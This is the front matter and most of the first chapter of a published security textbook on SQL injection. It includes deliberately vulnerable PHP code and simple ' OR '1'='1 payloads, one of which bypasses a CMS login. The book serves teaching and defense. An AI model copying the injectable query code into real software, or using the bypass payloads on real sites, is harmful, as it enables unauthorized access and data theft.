{
  "raw_text": "\nSQL Injection Attacks and Defense \nSecond Edition  \nJustin Clarke  \n \nTable of Contents  \nCover image  \nTitle page  \nCopyright  \nAcknowledgements  \nDedication  \nContributing Authors  \nLead Author and Technical  \nIntroduction to the 2nd Edition  \nChapter 1. What Is SQL Injection? \nIntroduction \nUnderstanding How Web Applications Work  \nUnderstanding SQL Injection \nUnderstanding How It Happens  \nSum mary  \n\nSolutions Fast Track  \nChapter 2. Testing for SQL Injection  \nIntroduction \nFinding SQL Injection Confirming SQL Injection  \nAutomating SQL Injection Discovery  \nSummary  \nSolutions Fast Track  \nChapter 3. Reviewing Code for SQL Injection  \nIntroduction Reviewing source code for SQL injection  \nAutomated source code review  \nSummary  \nSolutions fast track  \nChapter 4. Exploiting SQL injection  \nIntrod uction  \nUnderstanding common exploit techniques  \nIdentifying the database  \nExtracting data through UNION statements  \nUsing conditional statements  \nEnumerating the database schema  \nInjecting into “INSERT” queries  \nEscalating privileges  \nStealing the password hashes  \nOut-of-band communication  \nSQL injection on mobile devices  \nAutomating SQL injection  exploitation  \nSummary  \nSolutions Fast Track  \nChapter 5. Blind SQL Injection Exploitation  \nIntroduction \nFinding and confirming blind SQL injection Using time -based techniques  \nUsing Response -Based Techniques  \nUsing Alternative Channels  \nAutomating blind SQL injection exploitation  \nSummary  \nSolutions fast track  \nChapter 6. Exploiting the operating system  \nIntroduction Accessing the file system  \nExecuting operating system commands  \nConsolidating access  \nSummary  \nSolutions fast track  \nReferences  \nChapter 7. Advance d topics  \nIntroduction \nEvading input filters  \nExploiting second -order SQL injection  \nExploiting client -side SQL injection  \nUsing hybrid attacks  \nSummary  \nSolutions fast track  \nChapter 8. Code -level defenses  \nIntroduction \nDomain Driven Security  \nUsing parameterized statements  \nValidating input  \nEncoding output  \nCanonicalization  \nDesign Techniques to Avoid the Dangers of SQL Injection Summary  \nSolutions fast track  \nChapter 9. Platform level defenses  \nIntroduction \nUsing runtime protection  \nSecuring the database  \nAdditional deployment considerations  \nSummary  \nSolution s fast track  \nChapter 10. Confirming and Recovering from SQL Injection Attacks  \nIntroduction \nInvestigating a suspected SQL injection attack  \nSo, you’re a victim —now what?  \nSummary  \nSolutions fast track  \nChapter 11. References  \nIntroduction Structured query language (SQL) primer  \nSQL injection quick reference  \nBypassing input validation filters  \nTroubleshooting SQL injection attacks  \nSQL injection on other platforms  \nResources  \nSolutions fast track  \nIndex  \nCopyright  \nAcquiring Editor:  Chris Katsaropolous  \nDevelopment Editor:  Heather Scherer  \nProject Manager:  Jessica Vaughan  \nDesigner:  Russell Purdy  \nSyngress  is an imprint of Elsevier  \n225 Wyman Street, Waltham, MA 02451, USA  \n© 2012 Elsevier, Inc. All rights reserved.  \nNo part of this publication may be reproduced or transmitted in any form or by any means, electronic or \nmechanical, including photocopying, recording, or any information storage and retrieval system, without  \npermission in writing from the publisher. Details on how to seek permission, further information about the \nPublisher’s permissions policies and our arrangements with organizations such as the Copyright Clearance Center \nand the Copyright Licensing Agency, can be found at our website: www.elsevier.com/permissions . \nThis book and the individual contributions contained in it are protected under copyright by the Publisher (other than as may be noted herein).  \nNotices  \nKnowledge and best practice in this field are constantly changing. As new research and experience broaden our understanding, \nchanges in research methods or professional practices, may become necessary. Practitioners and researchers must always rely \non their own experience and knowledge in evaluating and using any information or methods described herein. In using such \ninformation or methods they should be mindful of their own safety and the safety of others, including parties for whom they \nhave a professional responsibility.  \nTo the fullest extent of the law, neither the Publisher nor the authors, contributors, or editors, assume any liability for a ny \ninjury and/or damage to persons or property as a matter of products liability, negligence or otherwise, or from any use or \noperation of any methods, products, instructions, or ideas contained in the material herein.  \nLibrary of Congress Cataloging- in-Publication Data  \nApplication submitted  \nBritish Library Cataloguing- in-Publication Data  \nA catalogue record for this book is available from the British Library.  \nISBN: 978- 1-59749- 963-7 \nPrinted in the United States of America  \n12 13 14 15 16   10 9 8 7 6 5 4 3 2 1  \n \nFor information on all Syngress publications visit our website at www.syngress.com  \n \n \n \n \n \n \n \n \n \n \n \n \n \n\nAcknowledgements  \nJustin would like to thank the Syngress editing team (and especially Chris Katsaropoulos and \nHeather Scherer) for once again being willing to take on a book which (in the publishing industry) has a ridiculous number of authors involved. He’d also like to thank, in his role as \nchief cat -herder, the author team for all pulling together to get this project completed.  \n \nDedication  \nJustin would like to dedicate this book to his daughter Adena for being a continual delight to him. \nDave would like to express heartf elt thanks to his extremely beautiful wife Nicole and \ndaughter Isla Rose, who continuously support and inspire him in all endeavors. \nSumit ‘sid’ Siddharth would like to thank his beautiful wife Supriya and his gorgeous \ndaughter Shriya for their support. He  would also like to thank his pentest team at 7Safe for \nputting up with him. \nAlberto would like to dedicate this book to all the hackers worldwide who have \nresearched the material and written the tools described in this book. I would also like to dedicate it to Franziskaner Weissbier Brewery, Munich, without which my contribution would \nnot have been possible.  \n \n \n  \n \n \n \nContributing Authors  \nRodrigo Marcos Alvarez  (CREST consultant, MSc, BSc, CISSP, CNNA, OPST, MCP) is the \ntechnical director of SECFORCE, a leading penetration testing consultancy. When not leading \nthe technical team, Rodrigo still enjoys getting actively involved in the delivery of security assessments and getting his hands dirty writing tools and working on interesting new hacking techniques.  \nRodrigo is  a contributor to the OWASP project and a security researcher. He is \nparticularly interested in network protocol analysis via fuzzing testing. Among other projects, he has released TAOF, a protocol agnostic GUI fuzzer, and proxyfuzz, a TCP/UDP proxy which fuzzes network traffic on the fly. Rodrigo has also contributed to the web security field \nby releasing bsishell, a python interacting blind SQL injection shell and developing TCP socket reusing attacking techniques.  \nKevvie Fowler  (GCFA Gold, CISSP, MCTS, M CDBA, MCSD, MCSE) leads the \nTELUS Security Intelligence Analysis practice where he delivers advanced event analysis and proactive intelligence to protect customers against present and emerging threats.  \nHe is also the founder and principal consultant of Ringzero, a security research and \nforensic services company. Kevvie’s recent research has focused on database forensics, rootkits and native encryption flaws which he has presented at industry conferences including Black Hat, SecTor and OWASP AppSec Asia.  \nKevvie is author of SQL Server Forensic Analysis and contributing author to several \ninformation security and forensics books. As a recognized SANS forensicator and GIAC Advisory Board member he helps guide the direction of emerging security and forensic resea rch. Kevvie serves as a trusted advisor to public and private sector clients and his thought \nleadership has been featured within Information Security Magazine, Dark Reading and Kaspersky Threatpost.  \nDave Hartley is a Principal Security Consultant for MWR I nfoSecurity operating as a \nCHECK and CREST Certified Consultant (Application and Infrastructure). MWR InfoSecurity supply services which support their clients in identifying, managing and mitigating their Information Security risks.  \nDave has performed a wi de range of security assessments and provided a myriad of \nconsultancy services for clients in a number of different sectors, including financial \ninstitutions, entertainment, media, telecommunications, and software development companies \nand government organizations worldwide. \nDave also sits on the CREST assessors’ and NBISE advisory panels, where he invigilates \nexaminations and collaboratively develops new CREST examination modules. CREST is a standards -based organization for penetration test suppliers incor porating a best practice \ntechnical certification program for individual consultants. Dave has also been actively engaged in creating a US centric examination process in conjunction with NBISE.  \nDave has been working in the IT Industry since 1998 and his experience includes a range \nof IT Security and disciplines. Dave is a published author and regular contributor to many information security periodicals and is also the author of the Bobcat SQL injection exploitation tool. \nAlexander Kornbrust  is the founder of  Red-Database- Security, a company specializing \nin database security. He provides database security audits, security training and consulting to customers worldwide. Alexander is also involved with designing and developing the McAfee Security Scanner for Dat abases, the leading tool for database security. Alexander has worked \nwith Oracle products since 1992 and his specialties are the security of Oracle databases and architectures. He has reported more than 1200 security bugs to Oracle and holds a masters degree (Diplom -Informatiker) in computer science from the University of Passau.  \nErlend Oftedal  works as a consultant at Bekk Consulting AS in Oslo in Norway and has \nbeen head of Bekk’s security competency group for several years. He spends his days as a securi ty adviser and developer for Bekk’s clients, and he also does code reviews and security \ntesting.  \nHe has done talks on web application security at both software development and security \nconferences like Javazone and OWASP AppSec Europe, and at user groups a nd universities in \nNorway and abroad. He is a security researcher and is very involved in the OWASP Norway chapter. He is also a member of the Norwegian Honeynet Project.  \nErlend holds a masters degree in computer science from the Norwegian University of \nScience and Technology (NTNU).  \nGary O’Leary -Steele (CREST Consultant) is the Technical Director of Sec- 1 Ltd, based \nin the UK. He currently provides senior -level penetration testing and security consultancy for a \nvariety of clients, including a number of lar ge online retailers and financial sector \norganizations. His specialties include web application security assessment, network penetration \ntesting and vulnerability research. Gary is also the lead author and trainer for the Sec -1 \nCertified Network Security P rofessional (CNSP) training program that has seen more than \n3,000 attendees since its launch. Gary is credited by Microsoft, RSA, GFI, Splunk, IBM and Marshal Software for the discovery of security flaws within their commercial applications.  \nAlberto Revell i is a security researcher and the author of sqlninja, an open source toolkit \nthat has become a “weapon of choice” when exploiting SQL Injection vulnerabilities on web applications based on Microsoft SQL Server. As for his day job, he works for a major commodities trading company, mostly breaking and then fixing anything that happens to tickle \nhis curiosity.  \nDuring his career he has assisted a multitude of companies including major financial \ninstitutions, telecom operators, media and manufacturing companies . He has been invited as a \nspeaker to several security conferences, including EuSecWest, SOURCE, RSA, CONFidence, Shakacon and AthCon.  \nHe resides in London, enjoying its awful weather and its crazy nightlife together with his \ngirlfriend.  \nSumit “sid” Siddharth works as a Head of Penetration Testing for 7Safe Limited in the \nUK. He specializes in application and database security and has more than 6 years of pentesting experience. Sid has authored a number of whitepapers and tools. He has bee n a \nSpeaker/Trainer at many security conferences including Black Hat, DEF CON, Troopers, OWASP Appsec, Sec- T etc. He also runs the popular IT security blog: www.notsosecure.com  \nMarco Slaviero  is an associate at SensePost, where he heads up SensePost Labs (current \nheadcount: 1.5). He has spoken on a variety of security topics, including SQL injection, at industry conferences such as BlackHat USA and DefCon. Marco’s areas of expertise cover application testing with a  side interest in networks, providing senior consulting to clients on \nfour continents.  \nMarco lives with Juliette, his wonderful wife.  \nA few years ago, Marco earned a masters degree from the University of Pretoria, but \nthat’s all in the past now. He still h ates figs.  \nDafydd Stuttard is an independent security consultant, author and software developer \nspecializing in penetration testing of web applications and compiled software. Dafydd is author \nof the best -selling Web Application Hacker’s Handbook . Under the  alias “PortSwigger”, he \ncreated the popular Burp Suite of web application hacking tools. Dafydd has developed and presented training courses at security conferences and other venues around the world. Dafydd holds Masters and Doctorate degrees in philosoph y from the University of Oxford. \n \nLead Author and Technical Editor  \nJustin Clarke  is a co -founder and Director of Gotham Digital Science, an information security \nconsulting firm that works with clients to identify, prevent, and manage security risks. He has over fifteen years experience in testing the security of networks, and software for large financial, retail, and technology clients in the United States, United Kingdom and New Zealand  \nJustin is a contributing author to a number of computer security books, as well as a \nspeaker at many conferences and events on security topics, including Black Hat, EuSecWest, OSCON, ISACA, RSA, SANS, OWASP, and the British Computer Society. He is the author of the Open Source SQLBrute blind SQL injection exploitation tool, a nd is the Chapter Leader \nfor the London chapter of OWASP.  \nJustin holds a Bachelor’s degree in Computer Science from the University of Canterbury \nin New Zealand, as well as postgraduate diplomas in Strategic Human Resources Management and Accounting. Ultima tely he’s not sure which of those turned out to be handier.  \n \n \n \n \n \n \nIntroduction to the 2nd Edition  \nA lot of time has passed since May 2009 when the first edition of this book finally hit the \nshelves and here we are some three years later with a second edition. Wh en we discussed the \nidea for the first edition, SQL injection had already been around for over a decade and was definitely nothing new, yet even in 2008 (some 10 years after its discovery and when the first edition began to take shape) people still didn’t possess a comprehensive understanding of what SQL injection is, how to discover SQL injection vulnerabilities and/or to exploit them; let alone how to defend against their exploitation nor how to avoid their presence in the first place. Also prevalent was the view that SQL injection was only relevant to Web applications, and that this wasn’t a risk factor for hybrid attacks or usable as a method of penetrating an organization’s external security controls – a fact amply proven false by some of the hacking \nincidents that occurred at about the time of the release of the first edition (Heartland Payment \nSystems for example).  \nNow it is 2012 as we are completing the second edition, and still little has changed in the \nbasics of SQL injection, however technology has  moved on and some new progress has been \nmade in applying SQL injection in newer areas such as mobile applications, and client -side \nvectors via HTML5. This also gave my co -authors and I an opportunity to address some of the \nfeedback we got from readers of the first edition. In this second edition, as well as comprehensively updating all of the content in the book and covering new technologies and approaches, we have increased the scope of database coverage to include PostgreSQL, as well \nas Microsoft SQL Ser ver, Oracle and MySQL as the primary database platforms we cover in \nall chapters, with code examples in Java, .NET and PHP where relevant.  \nThe book is broadly split into four sections – understanding SQL injection ( Chapter 1 ), \nfinding SQL injection ( Chapters 2  and 3), exploiting SQL injection ( Chapters 4, 5, 6, and 7), \nand defending against SQL injection ( Chapters 8, 9, and 10). Each of these sections is intended \nto appeal to different audiences, from all readers (understanding), to security professionals and penetrations testers (finding and exploiting), to developers and IT professionals managing databases (finding and def ending). To round out the book we have Chapter 11, the reference \nchapters, which also contains information on other database platforms not covered in the book in detail, allowing the reader to customize the techniques discussed earlier for other database platforms they may come across.  \nSome more detail about what is included in each Chapter can be found below:  \nChapter One – Understanding what SQL injection is, and how it happens  \nChapter Two – How to find SQL injection fr om a web application front end, including \nhow to detect the possible presence of SQL injection, how to confirm SQL injection is present, \nand how to automated finding SQL injection.  \nChapter Three – How to find SQL injection in software by reviewing the code , both \nmanually and via automation. \nChapter Four – How to Exploit SQL injection, including common techniques, UNION \nand conditional statements, enumerating the schema, stealing password hashes and automating exploitation.  \nChapter Five – How to Exploit Blin d SQL injection, including using time -based, \nresponse -based and alternative channels to return data.  \nChapter Six – Exploiting the Operating System via SQL injection, including reading and \nwriting files, and executing Operating System commands via SQL injec tion. \nChapter Seven – Advanced Exploitation Topics, including input filter evasion, exploiting \nSecond -Order SQL injection, exploiting client- side SQL injection, and executing hybrid \nattacks via SQL injection.  \nChapter Eight – Defending your code against SQL  injection, including design -based \napproaches, use of parameterization, encoding, and validation approaches to avoid SQL injection.  \nChapter Nine – Defending your application platform against SQL injection, including use \nof runtime protections, hardening the database and secure deployment considerations to mitigate the impact of SQL injection.  \nChapter Ten – Confirming and recovering from SQL injection attacks, including how to \ndetermine if you’ve fallen prey to SQL injection, confirming whether the SQL injec tion was \nsuccessful, and how to recover if you’ve been hacked by SQL injection. \nChapter Eleven – References chapter, including a primer on SQL, a SQL injection quick \nreference on Microsoft SQL Server, Oracle, MySQL, and PostgreSQL, as well as details of SQL injection on other platforms such as DB2, Sybase, Access and others.  \nChapter 1  \nWhat Is SQL Injection?  \nDave Hartley  \nSolutions in this chapter:  \n• Understanding How Web Applications Work \n• Understanding SQL Injection • Understanding How It Happens  \nIntroduction  \nPeople say they know what SQL injection is, but all they have heard about or experienced are \ntrivial examples. SQL injection is one of the most devastating vulnerabilities that impact a business, as it can lead to exposure of all of the sensit ive information stored in an application’s \ndatabase, including handy information such as usernames, passwords, names, addresses, phone numbers, and credit card details. \nSo, what exactly is SQL injection? It is the vulnerability that results when you give a n \nattacker the ability to influence the Structured Query Language (SQL) queries that an application passes to a back -end database. By being able to influence what is passed to the \ndatabase, the attacker can leverage the syntax and capabilities of SQL itsel f, as well as the \npower and flexibility of supporting database functionality and operating system functionality available to the database. SQL injection is not a vulnerability that exclusively affects Web applications; any code that accepts input from an untrusted source and then uses that input to form dynamic SQL statements could be vulnerable (e.g. “fat client” applications in a client/server architecture). In the past, SQL injection was more typically leveraged against server side databases, however wit h the current HTML5 specification, an attacker could \nequally execute JavaScript or other codes in order to interact with a client -side database to \nsteal data. Similarly with mobile applications (such as on the Android platform) malicious applications and/or client side script can be leveraged in similar ways (see labs.mwrinfosecurity.com/notices/webcontentresolver/ for more info).  \nSQL injection has probably existed since SQL databases were first connected to Web \napplications. However, Rain Forest Puppy is w idely credited with its discovery —or at least for \nbringing it to the public’s attention. On Christmas Day 1998, Rain Forest Puppy wrote an \narticle titled “NT Web Technology Vulnerabilities”  for Phrack \n(www.phrack.com/issues.html?issue=54&id=8#article ), an e -zine written by and for hackers. \nRain Forest Puppy also released an advisory on SQL injection (“How I hacked PacketStorm,” located at www.wiretrip.net/rfp/txt/rfp2k01.txt ) in early 2000 that detailed how SQL injection \nwas used to compromise a popular Web site. Since then, many researchers have developed and refined techniques for exploiting SQL injection. However, to thi s day many developers and \nsecurity professionals still do not understand it well. \nIn this chapter, we will look at the causes of SQL injection. We will start with an overview \nof how Web applications are commonly structured to provide some context for under standing \nhow SQL injection occurs. We will then look at what causes SQL injection in an application at the code level, and what development practices and behaviors lead us to this. \nUnderstanding How Web Applications Work  \nMost of us use Web applications on a daily basis, either as part of our vocation or in order to access our e- mail, book a holiday, purchase a product from an online store, view a news item \nof interest, and so forth. Web applications come in all shapes and sizes. \nOne thing that Web applicati ons have in common, regardless of the language in which they \nwere written, is that they are interactive and, more often than not, are database -driven. \nDatabase -driven Web applications are very common in today’s Web- enabled society. They \nnormally consist of  a back -end database with Web pages that contain server -side script written \nin a programming language that is capable of extracting specific information from a database depending on various dynamic interactions with the user. One of the most common applications for a database- driven Web application is an e -commerce application, where a \nvariety of information is stored in a database, such as product information, stock levels, prices, postage and packing costs, and so on. You are probably most familiar with t his type of \napplication when purchasing goods and products online from your e -retailer of choice. A \ndatabase -driven Web application commonly has three tiers: a presentation tier (a Web browser \nor rendering engine), a logic tier (a programming language, such as C#, ASP, .NET, PHP, JSP, etc.), and a storage tier (a database such as Microsoft SQL Server, MySQL, Oracle, etc.). The Web browser (the presentation tier, such as Internet Explorer, Safari, Firefox, etc.) sends \nrequests to the middle tier (the logic tier), which services the requests by making queries and \nupdates against the database (the storage tier).  \nTake, for example, an online retail store that presents a search form that allows you to sift \nand sort through products that are of particular interest , and provides an option to further refine \nthe products that are displayed to suit financial budget constraints. To view all products within the store that cost less than $100, you could use the following URL:  \n• http://www.victim.com/products.php?val=100  \nThe following PHP script illustrates how the user input ( val) is passed to a dynamically \ncreated SQL statement. The following section of the PHP code is executed when the URL is requested:  \n// connect to the database  \n$conn = mysql_connect(“localhost”,“username”,“password”);  \n// dynamically build the sql statement with the input  \n$query = “SELECT ∗  FROM Products WHERE Price < ‘$_GET[“val”]’ ”. \n  “ORDER BY ProductDescription”;  \n// execute the query against the database  \n$result = mysql_query($query);  \n// iterate through the record set  \nwhile($row = mysql_fetch_array($result, MYSQL_ASSOC))  \n{ \n // display the results to the browser  \n echo “Description : {$row[‘ProductDescription’]} <br>”.  \n  “Product ID : {$row[‘ProductID’]} <br>”.  \n  “Price : {$row[‘Price’]} <br><br>”;  \n} \nThe following code sample more clearly illustrates the SQL statement that the PHP script \nbuilds and executes. The statement will return all of the products in the databas e that cost less \nthan $100. These products will then be displayed and presented to your Web browser so that \nyou can continue shopping within your budget constraints. In principle, all interactive database -driven Web applications operate in the same way, or  at least in a similar fashion: \nSELECT ∗ \nFROM Products  \nWHERE Price <‘100.00’  \nORDER BY ProductDescription;  \nA Simple Application Architecture  \nAs noted earlier, a database- driven Web application commonly has three tiers: presentation, \nlogic, and storage. To help you better understand how Web application technologies interact to present you with a feature -rich Web experience, Figure 1.1 illustrates the simple three -tier \nexample that I outlined previously.  \n \nFigure 1.1  Simple Three- Tier Architecture  \nThe presentation tier is the topmost level of the application. It displays information related \nto such services such as browsing merchandise, purchasing, and shopping cart contents, and it communicates with other tiers by outputting results to the browser/ client tier and all other tiers \nin the network. The logic tier is pulled out from the presentation tier, and as its own layer, it \n\ncontrols an application’s functionality by performing detailed processing. The data tier consists \nof database servers. Here, i nformation is stored and retrieved. This tier keeps data independent \nfrom application  servers or business logic. Giving data their own tier also improves scalability \nand performance. In Figure 1.1, the Web browser (pr esentation) sends requests to the middle \ntier (logic), which services them by making queries and updates against the database (storage). A fundamental rule in a three -tier architecture is that the presentation tier never communicates \ndirectly with the data  tier; in a three -tier model, all communication must pass through the \nmiddleware tier. Conceptually, the three -tier architecture is linear.  \nIn Figure 1.1, the user fires up his Web browser and connects to http://www.victim.com. \nThe Web server that resides in the logic tier loads the script from the file system and passes it through its scripting engine, where it is parsed and executed. The script opens a connection to the storage t ier using a database connector and executes an SQL statement against the \ndatabase. The database returns the data to the database connector, which is passed to the scripting engine within the logic tier. The logic tier then implements any application or business logic rules before returning a Web page in HTML format to the user’s Web browser \nwithin the presentation tier. The user’s Web browser renders the HTML and presents the user with a graphical representation of the code. All of this happens in a matter of seconds and is transparent to the user.  \nA More Complex Architecture  \nThree- tier solutions are not scalable, so in recent years the three- tier model was reevaluated \nand a new concept built on scalability and maintainability was created: the n- tier applica tion \ndevelopment paradigm. Within this a four -tier solution was devised that involves the use of a \npiece of middleware, typically called an application server , between the Web server and the \ndatabase. An application server in an n- tier architecture is a server that hosts an application \nprogramming interface (API) to expose business logic and business processes for use by applications. Additional Web servers can be introduced as requirements necessitate. In addition, the application server can talk to several sources of data, including databases, \nmainframes, or other legacy systems.  \nFigure 1.2 depicts a simple, four -tier architecture.  \n \nFigure 1.2  Four -Tier Architecture  \nIn Figure 1.2, the Web browser (presentation) sends requests to the middle tier (logic), \nwhich in turn calls the exposed APIs of the application server residing within the application \ntier, which services them by making queries and updates against the database (storage ). \nIn Figure 1.2, the user fires up his Web browser and connects to http://www.victim.com. \nThe Web server that resides in the logic tier loads the script from the file system and passes it through its scripting engine where it is parsed and executed. The script calls an exposed API from the application server that resides in the application tier. The application server opens a connection to the storage tier using a database connector and executes an SQL statement against the database. The database returns the data to the database connector and the application server then implements any applicat ion or business logic rules before returning the \ndata to the Web server. The Web server then implements any final logic before presenting the data in HTML format to the user’s Web browser within the presentation tier. The user’s Web browser renders the HTM L and presents the user with a graphical representation of the code. \nAll of this happens in a matter of seconds and is transparent to the user.  \nThe basic concept of a tiered architecture involves breaking an application into logical \nchunks, or tiers, each of which is assigned general or specific roles. Tiers can be located on different machines or on the same machine where they virtually or conceptually separate from one another. The more tiers you use, the more specific each tier’s role is. Separating the \nresponsibilities of an application into multiple tiers makes it easier to scale the application, allows for better separation of development tasks among developers, and makes an application more readable and its components more reusable. The approach can a lso make applications \nmore robust by eliminating a single point of failure. For example, a decision to change database vendors should require nothing more than some changes to the applicable portions of the application tier; the presentation and logic tier s remain unchanged. Three -tier and  four-tier \narchitectures are the most commonly deployed architectures on the Internet today; however, \n\nthe n-tier model is extremely flexible and, as previously discussed, the concept allows for \nmany tiers and layers to be logically separated and deployed in a myriad of ways.  \nUnderstanding SQL Injection  \nWeb applications are becoming more sophisticated and increasingly technically complex. They \nrange from dynamic Internet and intranet portals, such as e- commerce sites and par tner \nextranets, to HTTP -delivered enterprise applications such as document management systems \nand ERP applications. The availability of these systems and the sensitivity of the data that they store and process are becoming critical to almost all major businesses, not just those that have online e -commerce stores. Web applications and their supporting infrastructure and \nenvironments use diverse technologies and can contain a significant amount of modified and customized codes. The very nature of their featur e-rich design and their capability to collate, \nprocess, and disseminate information over the Internet or from within an intranet makes them a popular target for attack. Also, since the network security technology market has matured and there are fewer oppo rtunities to breach information systems through network -based \nvulnerabilities, hackers are increasingly switching their focus to attempting to compromise applications. \nSQL injection is an attack in which the SQL code is inserted or appended into \napplicatio n/user input parameters that are later passed to a back -end SQL server for parsing \nand execution. Any procedure that constructs SQL statements could potentially be vulnerable, as the diverse nature of SQL and the methods available for constructing it provi de a wealth of \ncoding options. The primary form of SQL injection consists of direct insertion of code into parameters that are concatenated with SQL commands and executed. A less direct attack \ninjects malicious code into strings that are destined for stora ge in a table or as metadata. When \nthe stored strings are subsequently concatenated into a dynamic SQL command, the malicious code is executed. When a Web application fails to properly sanitize the parameters which are passed to dynamically created SQL statements (even when using parameterization techniques) it is possible for an attacker to alter the construction of back- end SQL statements. When an \nattacker is able to modify an SQL statement, the statement will execute with the same rights as the applicati on user; when using the SQL server to execute commands that interact with the \noperating system, the process will run with the same permissions as the component that executed the command (e.g. database server, application server, or Web server), which is of ten \nhighly privileged.  \nTo illustrate this, let’s return to the previous example of a simple online retail store. If you \nremember, we attempted to view all products within the store that cost less than $100, by using \nthe following URL:  \n• http://www.victim.com/products.php?val=100  \nThe URL examples in this chapter use GET  parameters instead of POST  parameters for ease \nof illustration. POST  parameters are just as easy to manipulate; however, this usuall y involves \nthe use of something else, such as a traffic manipulation tool, Web browser plug -in, or inline \nproxy application.  \nThis time, however, you are going to attempt to inject your own SQL commands by \nappending them to the input parameter val . You can do this by appending the string ‘OR ‘1’= \n‘1 to the URL:  \n• http://www.victim.com/products.php?val=100’ OR ‘1’=‘1  \nThis time, the SQL statement that the PHP script builds and executes will return all of the \nproducts in the database regardless of their price. This is because you have altered the logic of the query. This happens because the appended statement results in the OR  operand of the query \nalways returning true , that is, 1 will always be equal to  1. Here is the query that was built and \nexecuted:  \nSELECT ∗ \nFROM ProductsTbl  \nWHERE Price < ‘100.00’ OR ‘1’ = ‘1’  \nORDER BY ProductDescription;  \nThere are many ways to exploit SQL injection vulnerabilities to achieve a myriad of goals; \nthe success of the atta ck is usually highly dependent on the underlying database and \ninterconnected systems that are under attack. Sometimes it can take a great deal of skill and perseverance to exploit a vulnerability to its full potential.  \nThe preceding simple example demonstr ates how an attacker can manipulate a dynamically \ncreated SQL statement that is formed from input that has not been validated or encoded to perform actions that the developer of an application did not foresee or intend. The example, \nhowever, perhaps does n ot illustrate the effectiveness of such a vulnerability; after all, we only \nused the vector to view all of the products in the database, and we could have legitimately done \nthat by using the application’s functionality as it was intended to be used in the first place. What if the same application can be remotely administered using a content management system (CMS)? A CMS is a Web application that is used to create, edit, manage, and publish content to a Web site, without having to have an in- depth understanding of or ability to code in \nHTML. You can use the following URL to access the CMS application:  \n• http://www.victim.com/cms/login.php?username=foo&password=bar  \nThe CMS applicati on requires that you supply a valid username and password before you \ncan access its functionality. Accessing the preceding URL would result in the error “Incorrect username or password, please try again.” Here is the code for the login.php script:  \n// connect to the database  \n$conn = mysql_connect(“localhost”,“username”,“password”);  \n// dynamically build the sql statement with the input  \n$query = “SELECT userid FROM CMSUsers WHERE user = ‘$_GET[“user”]’ ”.  \n  “AND password = ‘$_GET[“password”]’”;  \n// execute the query against the database  \n$result = mysql_query($query);  \n// check to see how many rows were returned from the database  \n$rowcount = mysql_num_rows($result);  \n// if a row is returned then the credentials must be valid, so  \n// forward the user to the admin pages  \nif ($rowcount ! = 0){header(“Location: admin.php”);}  \n// if a row is not returned then the credentials must be invalid  \nelse {die(‘Incorrect username or password, please try again.’)}  \nThe login.php script dynamically creates an SQL statemen t that will return a record set if a \nusername and matching password are entered. The SQL statement that the PHP script builds \nand executes is illustrated more clearly in the following code snippet. The query will return the userid  that corresponds to the user if the user  and password values entered match a \ncorresponding stored value in the CMSUsers table: \nSELECT userid  \nFROM CMSUsers  \nWHERE user = ‘foo’ AND password = ‘bar’;  \nThe problem with the code is that the application developer believes the number of records \nreturned when the script is executed will always be zero or one. In the previous injection example, we used the exploitable vector to change the meaning of the SQL q uery to always \nreturn true. If we use the same technique with the CMS application, we can cause the \napplication logic to fail. By appending the string ‘OR ‘1’=’1  to the following URL, the SQL \nstatement that the PHP script builds and executes this time will return all of the userid s for all \nof the users in the CMSUsers table. The URL would look like this:  \n• http://www.victim.com/cms/login.php?username=foo&password=bar ’ OR ‘1’=’1  \nAll of the userid s are returned because we altered the logic of the query. This happens \nbecause the appended statement results in the OR  operand of the query always returning true , \nthat is, 1 will always be equal to 1. Here is the query that was built and ex ecuted:  \nSELECT userid  \nFROM CMSUsers  \nWHERE user = ‘foo’ AND password = ‘password’ OR ‘1’ = ‘1’;  \nThe logic of the application means that if the database returns more than zero records, we \nmust have entered the correct authentication credentials and should be  redirected and given \naccess to the protected admin.php script. We will normally be logged in as the first user in the CMSUsers table. An SQL injection vulnerability has allowed the application logic to be \nmanipulated and subverted. \nDo not try any of these  examples on any Web applications or systems, unless you have \npermission (in writing, preferably) from the application or system owner. In the United States, \nyou could be prosecuted under the Computer Fraud and Abuse Act of 1986 (www.cio.energy.gov/documents/ComputerFraud -AbuseAct.pdf ) or the USA PATRIOT Act \nof 2001. In the United Kingdom, you could be prosecuted under the Computer Misuse Act of 1990 ( www.opsi.gov.uk/acts/acts1990/Ukpga_19900018_en_1) and the revised Police and \nJustice Act of 2006 ( www.opsi.gov.uk/Acts/acts2006/ukpga_20060048_en_1). If successfully \ncharged and prosecuted, you could receive a fine or a lengthy prison sentence.  \nHigh -Profile Examples  \nIt is difficult to correctly and accurately gather data on exactly how many organizations are vulnerable to or have been compr omised via an SQL injection vulnerability, as companies in \nmany countries, unlike their US counterparts, are not obliged by law to publicly disclose when they have experienced a serious breach of security. However, security breaches and successful attacks executed by malicious attackers are now a favorite media topic for the world press. The \nsmallest of breaches, that historically may have gone unnoticed by the wider public, are often heavily publicized today.  \nSome publicly available resources can help you understand how large an issue SQL \ninjection is. For instance, the 2011 CWE (Common Weakness Enumeration)/SANS Top 25 Most Dangerous Software Errors is a list of the most widespread and critical errors that can lead to serious vulnerabilities in the softwar e. The top 25 entries are prioritized using inputs \nfrom over 20 different organizations, which evaluated each weakness based on prevalence, importance, and likelihood of exploit. It uses the Common Weakness Scoring System (CWSS) to score and rank the final  results. The 2011 CWE/SANS Top 25 Most Dangerous Software \nErrors list, places SQL injection at the very top ( http://cwe.mitre.org/top25/index.html ). \nIn addition, the Open Web Application Security Proje ct (OWASP) lists Injection Flaws \n(which include SQL injection) as the most serious security vulnerability affecting Web applications in its 2010 Top 10 list. The primary aim of the OWASP Top 10 is to educate \ndevelopers, designers, architects, and organizat ions about the consequences of the most \ncommon Web application security vulnerabilities. In the previous list published in 2007, SQL injection was listed at second place. OWASP, for 2010, changed the ranking methodology to estimate risk, instead of relying  solely on the frequency of the associated weakness. The \nOWASP Top 10 list has historically been compiled from data extracted from Common Vulnerabilities and Exposures (CVE) list of publicly known information security \nvulnerabilities and exposures publishe d by the MITRE Corporation ( http://cve.mitre.org/). The \nproblem with using CVE numbers as an indication of how many sites are vulnerable to SQL \ninjection is  that the data does not provide insight into vulnerabilities w ithin custom -built sites. \nCVE requests represent the volume of discovered vulnerabilities in commercial and open source applications; they do not reflect the degree to which those vulnerabilities exist in the real world. In reality, the situation is much, much worse. Nonetheless, the trends report published in 2007 can make interesting reading ( http://cve.mitre.org/docs/vuln -trends/vuln-\ntrends.pdf ). \nWe can also look to other resources that collate information on compromised Web sites. \nZone -H, for instance, is a popular Web site that records 